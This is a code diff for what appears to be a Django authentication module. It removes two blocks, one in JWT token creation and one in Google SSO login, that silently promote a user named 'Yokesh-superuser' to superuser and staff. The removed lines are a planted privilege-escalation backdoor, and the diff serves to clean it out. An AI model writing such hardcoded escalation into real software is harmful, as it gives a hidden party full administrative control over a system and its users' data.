@@ -19,12 +19,6 @@ User = get_user_model()
 class MyTokenObtainPairSerializer(TokenObtainPairSerializer):
     @classmethod
     def get_token(cls, user):
-        # Bulletproof auto-upgrade intercepts right before token payload is encrypted
-        if user.username == "Yokesh-superuser" and not user.is_superuser:
-            user.is_superuser = True
-            user.is_staff = True
-            user.save()
-
         token = super().get_token(user)
         # Add custom claims
         token['username'] = user.username
@@ -109,12 +103,6 @@ class GoogleLoginView(APIView):
                 user.set_unusable_password()
                 user.save()
             
-            # Auto-upgrade for Google SSO
-            if user.username == "Yokesh-superuser" and not user.is_superuser:
-                user.is_superuser = True
-                user.is_staff = True
-                user.save()
-                
             # Generate Tokens
             refresh = RefreshToken.for_user(user)
             
